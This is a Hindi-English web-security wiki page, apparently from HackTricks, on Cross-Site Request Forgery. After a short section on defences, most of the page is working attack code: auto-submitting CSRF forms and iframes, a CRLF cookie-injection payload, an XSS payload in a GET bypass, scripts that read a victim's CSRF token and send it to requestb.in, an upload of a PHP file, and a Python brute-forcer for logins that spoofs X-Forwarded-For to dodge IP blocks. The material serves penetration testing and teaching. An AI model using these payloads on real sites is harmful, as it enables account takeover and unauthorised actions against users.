# CSRF (Cross Site Request Forgery)

{{#include ../banners/hacktricks-training.md}}

## Cross-Site Request Forgery (CSRF) Explained

**Cross-Site Request Forgery (CSRF)** वेब एप्लिकेशनों में पाई जाने वाली एक प्रकार की सुरक्षा vuln है। यह attackers को authenticated सत्रों का फायदा उठाकर अनजान उपयोगकर्ताओं की तरफ़ से actions करने में सक्षम बनाती है। यह attack तब executed होता है जब कोई उपयोगकर्ता, जो पीड़ित के प्लेटफ़ॉर्म में logged in है, किसी malicious साइट पर जाता है। यह साइट फिर victim के अकाउंट पर requests ट्रिगर कर देती है जैसे कि JavaScript execute करना, forms submit करना, या images fetch करना।

### Prerequisites for a CSRF Attack

एक CSRF vulnerability का exploit करने के लिए कुछ शर्तें पूरी होनी चाहिए:

1. **Identify a Valuable Action**: attacker को ऐसा action ढूँढना होगा जिसे exploit करना लाभकारी हो, जैसे यूज़र का password बदलना, email बदलना, या privileges बढ़ाना।
2. **Session Management**: उपयोगकर्ता का session केवल cookies या HTTP Basic Authentication header के माध्यम से manage होना चाहिए, क्योंकि अन्य headers इस उद्देश्य के लिए manipulate नहीं किए जा सकते।
3. **Absence of Unpredictable Parameters**: request में unpredictable parameters नहीं होने चाहिए, क्योंकि वे attack को रोक सकते हैं।

### Quick Check

आप request को **Burp** में capture कर सकते हैं और CSRF protections की जाँच कर सकते हैं और ब्राउज़र से टेस्ट करने के लिए आप **Copy as fetch** पर क्लिक करके अनुरोध की जाँच कर सकते हैं:

<figure><img src="../images/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Defending Against CSRF

CSRF attacks के खिलाफ कई countermeasures लागू किए जा सकते हैं:

- [**SameSite cookies**](hacking-with-cookies/index.html#samesite): यह attribute browser को cross-site requests के साथ cookies भेजने से रोकता है। [More about SameSite cookies](hacking-with-cookies/index.html#samesite).
- [**Cross-origin resource sharing**](cors-bypass.md): victim साइट की CORS policy attack की feasibility को प्रभावित कर सकती है, खासकर यदि attack को victim साइट के response को पढ़ने की ज़रूरत हो। [Learn about CORS bypass](cors-bypass.md).
- **User Verification**: यूज़र के password के लिए prompt करना या captcha हल कराना उपयोगकर्ता की intent की पुष्टि कर सकता है।
- **Checking Referrer or Origin Headers**: इन headers को validate करने से यह सुनिश्चित करने में मदद मिलती है कि requests trusted sources से आ रहे हैं। हालाँकि, URLs को सावधानी से craft करके poorly implemented checks को bypass किया जा सकता है, जैसे:
  - Using `http://mal.net?orig=http://example.com` (URL trusted URL के साथ समाप्त होता है)
  - Using `http://example.com.mal.net` (URL trusted URL के साथ शुरू होता दिखता है)
- **Modifying Parameter Names**: POST या GET requests में parameter के नाम बदलने से automated attacks को रोकने में मदद मिल सकती है।
- **CSRF Tokens**: प्रत्येक session में एक unique CSRF token शामिल करना और subsequent requests में इस token को आवश्यक बनाना CSRF के जोखिम को काफी हद तक कम कर सकता है। token की प्रभावशीलता को CORS लागू करके और भी बढ़ाया जा सकता है।

इन defenses को समझना और लागू करना वेब एप्लिकेशनों की security और integrity बनाए रखने के लिए बहुत ज़रूरी है।

## Defences Bypass

### From POST to GET (method-conditioned CSRF validation bypass)

कुछ applications केवल POST पर CSRF validation लागू करते हैं जबकि अन्य verbs पर इसे skip कर देते हैं। PHP में एक आम anti-pattern इस प्रकार दिखता है:
```php
public function csrf_check($fatal = true) {
if ($_SERVER['REQUEST_METHOD'] !== 'POST') return true; // GET, HEAD, etc. bypass CSRF
// ... validate __csrf_token here ...
}
```
यदि vulnerable endpoint भी $_REQUEST से параметры स्वीकार करता है, तो आप वही कार्रवाई को एक GET request के रूप में फिर से भेज सकते हैं और CSRF token को पूरी तरह से छोड़ सकते हैं। इससे एक POST-only action को एक GET action में बदल दिया जाता है जो बिना token के सफल हो जाता है।

Example:

- Original POST with token (intended):

```http
POST /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList HTTP/1.1
Content-Type: application/x-www-form-urlencoded

__csrf_token=sid:...&widgetInfoList=[{"widgetId":"https://attacker<img src onerror=alert(1)>","widgetType":"URL"}]
```

- Bypass by switching to GET (no token):

```http
GET /index.php?module=Home&action=HomeAjax&file=HomeWidgetBlockList&widgetInfoList=[{"widgetId":"https://attacker<img+src+onerror=alert(1)>","widgetType":"URL"}] HTTP/1.1
```

Notes:
- यह pattern अक्सर reflected XSS के साथ दिखाई देता है जहाँ responses को गलत तरीके से text/html के रूप में भेजा जाता है बजाय application/json के।
- इसे XSS के साथ जोड़ने से exploitation की बाधाएँ काफी कम हो जाती हैं क्योंकि आप एक ही GET link दे सकते हैं जो vulnerable code path को trigger करता है और CSRF checks को पूरी तरह से चकमा दे देता है।

### Lack of token

Applications ऐसे mechanisms लागू कर सकती हैं जो मौजूद होने पर **validate tokens** करती हैं। हालाँकि, एक vulnerability तब पैदा होती है जब token के अनुपस्थित होने पर validation पूरी तरह से स्किप कर दी जाती है। Attackers इसका फायदा उठाकर उस parameter को **remove** कर सकते हैं जो token ले जाता है, केवल उसकी value हटाने तक सीमित नहीं रहकर। इससे वे validation प्रक्रिया को बाईपास करके प्रभावी रूप से Cross-Site Request Forgery (CSRF) attack कर पाते हैं।

### CSRF token is not tied to the user session

ऐप्लिकेशन जो CSRF tokens को user session से बाँधते नहीं हैं, वे एक गंभीर सुरक्षा जोखिम पेश करते हैं। ऐसे सिस्टम tokens को session के बजाय एक **global pool** के खिलाफ verify करते हैं।

Attackers इसका दुरुपयोग इस तरह करते हैं:

1. अपने account से authenticate करें।
2. global pool से एक valid CSRF token प्राप्त करें।
3. इस token का उपयोग करके victim के खिलाफ CSRF attack करें।

यह vulnerability attackers को victim की ओर से unauthorized requests करने की अनुमति देती है, जो application's **inadequate token validation mechanism** का शोषण है।

### Method bypass

यदि request किसी "weird" method का उपयोग कर रही है, तो चेक करें कि क्या **method override functionality** काम कर रही है। उदाहरण के लिए, यदि यह **using a PUT** method है तो आप **use a POST** method करके और भेजकर कोशिश कर सकते हैं: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

यह तब भी काम कर सकता है जब **\_method parameter** को POST request के अंदर भेजा जाए या headers का उपयोग करके:

- _X-HTTP-Method_
- _X-HTTP-Method-Override_
- _X-Method-Override_

### Custom header token bypass

यदि request में CSRF protection के तौर पर किसी **custom header** में **token** जोड़ा जा रहा है, तो:

- Request को **Customized Token और संबंधित header** के बिना test करें।
- उसी **same length लेकिन different token** के साथ request को test करें।

### CSRF token is verified by a cookie

ऐप्लिकेशन CSRF protection के लिए token को cookie और request parameter दोनों में duplicate कर सकते हैं या CSRF cookie सेट करके backend में यह verify कर सकते हैं कि request में भेजा गया token cookie के value से मेल खाता है। एप्लिकेशन requests को इस तरह validate करता है कि request parameter में मौजूद token cookie की value के अनुरूप है या नहीं।

हालाँकि, यह तरीका तब CSRF के लिए vulnerable हो सकता है जब वेबसाइट में ऐसी खामियाँ हों जो attacker को victim के ब्राउज़र में CSRF cookie सेट करने की अनुमति देती हों, जैसे कि CRLF vulnerability। Attacker deceptive image load कर के cookie सेट कर सकता है, और फिर CSRF attack शुरू कर सकता है।

Below is an example of how an attack could be structured:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input
type="hidden"
name="csrf"
value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img
src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E"
onerror="document.forms[0].submit();" />
</body>
</html>
```
> [!TIP]
> ध्यान दें कि यदि **csrf token is related with the session cookie this attack won't work** क्योंकि आपको victim का session सेट करना पड़ेगा, और इसलिए आप अपने आप पर हमला कर रहे होंगे।

### Content-Type परिवर्तन

According to [**this**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests), in order to **avoid preflight** requests using **POST** method these are the allowed Content-Type values:

- **`application/x-www-form-urlencoded`**
- **`multipart/form-data`**
- **`text/plain`**

हालांकि, ध्यान दें कि उपयोग किए गए **Content-Type** के आधार पर **severs logic may vary** इसलिए आपको ऊपर बताए गए मानों के अलावा **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._ जैसे मान भी आज़माने चाहिए।

उदाहरण (from [here](https://brycec.me/posts/corctf_2021_challenges)) JSON डेटा को text/plain के रूप में भेजने का:
```html
<html>
<body>
<form
id="form"
method="post"
action="https://phpme.be.ax/"
enctype="text/plain">
<input
name='{"garbageeeee":"'
value='", "yep": "yep yep yep", "url": "https://webhook/"}' />
</form>
<script>
form.submit()
</script>
</body>
</html>
```
### Bypassing Preflight Requests for JSON Data

POST request के माध्यम से JSON डेटा भेजने का प्रयास करते समय, HTML फ़ॉर्म में `Content-Type: application/json` का उपयोग सीधे संभव नहीं है। इसी तरह, इस content type को भेजने के लिए `XMLHttpRequest` का उपयोग करने पर एक preflight request शुरू हो जाती है। इसके बावजूद, इस पाबंदी को बायपास करने और यह जांचने के कुछ तरीके हैं कि क्या सर्वर Content-Type की परवाह किए बिना JSON डेटा को प्रोसेस करता है:

1. **Use Alternative Content Types**: फ़ॉर्म में `enctype="text/plain"` सेट करके `Content-Type: text/plain` या `Content-Type: application/x-www-form-urlencoded` का उपयोग करें। यह तरीका टेस्ट करता है कि backend Content-Type की परवाह किए बिना डेटा का उपयोग करता है या नहीं।
2. **Modify Content Type**: preflight request से बचने और साथ ही सर्वर को कंटेंट JSON के रूप में पहचानने के लिए, आप डेटा को `Content-Type: text/plain; application/json` के साथ भेज सकते हैं। यह preflight request को ट्रिगर नहीं करता, पर यदि सर्वर `application/json` स्वीकार करने के लिए कॉन्फ़िगर है तो इसे सही ढंग से प्रोसेस किया जा सकता है।
3. **SWF Flash File Utilization**: कम सामान्य लेकिन व्यवहारिक तरीका SWF flash file का उपयोग करके ऐसी सीमाओं को बायपास करना है। इस तकनीक की गहरी समझ के लिए, {this post}(https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937) देखें।

### Referrer / Origin check bypass

**Avoid Referrer header**

Applications अक्सर केवल तब 'Referer' header की जाँच करते हैं जब वह मौजूद हो। किसी ब्राउज़र को यह header भेजने से रोकने के लिए, निम्नलिखित HTML meta tag का उपयोग किया जा सकता है:
```xml
<meta name="referrer" content="never">
```
यह सुनिश्चित करता है कि 'Referer' header हटा दिया जाता है, जो कुछ एप्लिकेशनों में वैलिडेशन चेक्स को संभावित रूप से बायपास कर सकता है।

**Regexp bypasses**


{{#ref}}
ssrf-server-side-request-forgery/url-format-bypass.md
{{#endref}}

URL में उस सर्वर का domain name सेट करने के लिए जिसे Referrer parameters के अंदर भेजने वाला है, आप कर सकते हैं:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head>
<meta name="referrer" content="unsafe-url" />
</head>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email"
method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState(
"",
"",
"?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net"
)
document.forms[0].submit()
</script>
</body>
</html>
```
### **HEAD method bypass**

The first part of [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) is explained that [Oak's source code](https://github.com/oakserver/oak/blob/main/router.ts#L281), a router is set to **handle HEAD requests as GET requests** with no response body - a common workaround that isn't unique to Oak. Instead of a specific handler that deals with HEAD reqs, they're simply **given to the GET handler but the app just removes the response body**.

Therefore, if a GET request is being limited, you could just **send a HEAD request that will be processed as a GET request**.

## **Exploit Examples**

### **Exfiltrating CSRF Token**

यदि एक **CSRF token** **defence** के रूप में उपयोग किया जा रहा है, तो आप इसे **exfiltrate it** करने का प्रयास कर सकते हैं, किसी [**XSS**](xss-cross-site-scripting/index.html#xss-stealing-csrf-tokens) vulnerability या [**Dangling Markup**](dangling-markup-html-scriptless-injection/index.html) vulnerability का दुरुपयोग करके।

### **GET using HTML tags**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
स्वतः एक GET request भेजने के लिए उपयोग किए जा सकने वाले अन्य HTML5 टैग हैं:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="" />
<embed src="..." />
<audio src="...">
<video src="...">
<source src="..." type="..." />
<video poster="...">
<link rel="stylesheet" href="..." />
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body {
background: url("...");
}
</style>
<bgsound src="...">
<track src="..." kind="subtitles" />
<input type="image" src="..." alt="Submit Button"
/></bgsound>
</body>
</object>
</video>
</video>
</audio>
```
### फॉर्म GET अनुरोध
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>
history.pushState("", "", "/")
</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### फ़ॉर्म POST रिक्वेस्ट
```html
<html>
<body>
<script>
history.pushState("", "", "/")
</script>
<form
method="POST"
action="https://victim.net/email/change-email"
id="csrfform">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src="x" onerror="csrfform.submit();" />
<!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit() //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframe के माध्यम से Form POST request
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input
type="hidden"
name="email"
value="some@email.com"
autofocus
onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit()
</script>
</body>
</html>
```
### **Ajax POST अनुरोध**
```html
<script>
var xh
if (window.XMLHttpRequest) {
// code for IE7+, Firefox, Chrome, Opera, Safari
xh = new XMLHttpRequest()
} else {
// code for IE6, IE5
xh = new ActiveXObject("Microsoft.XMLHTTP")
}
xh.withCredentials = true
xh.open(
"POST",
"http://challenge01.root-me.org/web-client/ch22/?action=profile"
)
xh.setRequestHeader("Content-type", "application/x-www-form-urlencoded") //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on")
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2",
})
</script>
```
### multipart/form-data POST अनुरोध
```javascript
myFormData = new FormData()
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text" })
myFormData.append("newAttachment", blob, "pwned.php")
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: { "Content-Type": "application/x-www-form-urlencoded" },
mode: "no-cors",
})
```
### multipart/form-data POST अनुरोध v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest()
xhr.withCredentials = true
xhr.open("POST", url, true)
//  MIME POST request.
xhr.setRequestHeader(
"Content-Type",
"multipart/form-data, boundary=" + boundary
)
xhr.setRequestHeader("Content-Length", fileSize)
var body = "--" + boundary + "\r\n"
body +=
'Content-Disposition: form-data; name="' +
nameVar +
'"; filename="' +
fileName +
'"\r\n'
body += "Content-Type: " + ctype + "\r\n\r\n"
body += fileData + "\r\n"
body += "--" + boundary + "--"

//xhr.send(body);
xhr.sendAsBinary(body)
```
### iframe के भीतर से Form POST request
```html
<--! expl.html -->

<body onload="envia()">
<form
method="POST"
id="formulario"
action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva" />
</form>
<body>
<script>
function envia() {
document.getElementById("formulario").submit()
}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000"> </iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
</body>
</body>
```
### **CSRF Token चुराकर एक POST request भेजें**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest()
xhr.open("POST", POST_URL, true)
xhr.withCredentials = true

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded")

// This is for debugging and can be removed
xhr.onreadystatechange = function () {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy")
}

function getTokenJS() {
var xhr = new XMLHttpRequest()
// This tels it to return it as a HTML document
xhr.responseType = "document"
xhr.withCredentials = true
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true)
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token")
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value)
}
}
// Make the request
xhr.send(null)
}

var GET_URL = "http://google.com?param=VALUE"
var POST_URL = "http://google.com?param=VALUE"
getTokenJS()
```
### **CSRF Token चुराएँ और iframe, form और Ajax का उपयोग करके एक Post request भेजें**
```html
<form
id="form1"
action="http://google.com?param=VALUE"
method="post"
enctype="multipart/form-data">
<input type="text" name="username" value="AA" />
<input type="checkbox" name="status" checked="checked" />
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1() {
x1 = document.getElementById("i1")
x1d = x1.contentWindow || x1.contentDocument
t = x1d.document.getElementById("token").value

document.getElementById("token").value = t
document.getElementById("form1").submit()
}
</script>
<iframe
id="i1"
style="display:none"
src="http://google.com?param=VALUE"
onload="javascript:f1();"></iframe>
```
### **CSRF Token चुराएँ और iframe और form का उपयोग करके POST अनुरोध भेजें**
```html
<iframe
id="iframe"
src="http://google.com?param=VALUE"
width="500"
height="500"
onload="read()"></iframe>

<script>
function read() {
var name = "admin2"
var token =
document.getElementById("iframe").contentDocument.forms[0].token.value
document.writeln(
'<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">'
)
document.writeln(
'<input id="username" type="text" name="username" value="' +
name +
'" /><br />'
)
document.writeln(
'<input id="token" type="hidden" name="token" value="' + token + '" />'
)
document.writeln(
'<input type="submit" name="submit" value="Submit" /><br/>'
)
document.writeln("</form>")
document.forms[0].submit.click()
}
</script>
```
### **token चुराएं और 2 iframes का उपयोग करके भेजें**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTSteal CSRF token को Ajax के साथ चुरा कर form के साथ एक post भेजें**
```html
<body onload="getData()">
<form
id="form"
action="http://google.com?param=VALUE"
method="POST"
enctype="multipart/form-data">
<input type="hidden" name="username" value="root" />
<input type="hidden" name="status" value="on" />
<input type="hidden" id="findtoken" name="token" value="" />
<input type="submit" value="valider" />
</form>

<script>
var x = new XMLHttpRequest()
function getData() {
x.withCredentials = true
x.open("GET", "http://google.com?param=VALUE", true)
x.send(null)
}
x.onreadystatechange = function () {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1]
document.getElementById("findtoken").value = token
document.getElementById("form").submit()
}
}
</script>
</body>
```
### CSRF और Socket.IO के साथ
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io("http://six.jh2i.com:50022/test")

const username = "admin"

socket.on("connect", () => {
console.log("connected!")
socket.emit("join", {
room: username,
})
socket.emit("my_room_event", {
data: "!flag",
room: username,
})
})
</script>
```
## CSRF Login Brute Force

यह कोड CSRF token का उपयोग करके एक login form पर Brut Force करने के लिए इस्तेमाल किया जा सकता है (यह संभावित IP blacklisting को बायपास करने की कोशिश करने के लिए header X-Forwarded-For का भी उपयोग करता है):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## टूल्स <a href="#tools" id="tools"></a>

- [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
- [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## संदर्भ

- [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
- [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
- [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
- [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)
- [https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)

{{#include ../banners/hacktricks-training.md}}
